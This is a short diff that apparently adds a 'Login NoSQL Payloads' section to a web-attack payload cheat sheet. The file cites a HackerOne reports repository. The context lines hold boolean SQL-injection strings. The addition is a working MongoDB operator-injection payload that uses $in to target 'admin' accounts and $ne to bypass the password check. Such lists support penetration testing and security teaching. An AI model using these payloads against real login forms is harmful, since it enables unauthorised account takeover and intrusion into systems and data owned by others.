@@ -199,3 +199,12 @@ https://github.com/reddelexc/hackerone-reports
 ' || 1 || '
 ' && '1' == '1
 ```
+# Login NoSQL Payloads
+
+```
+
+{"username":{"$in":[
+"admin",
+"ADMIN"]},"password":{
+"$ne":"dgdfdffdfdfdf"}}
+```
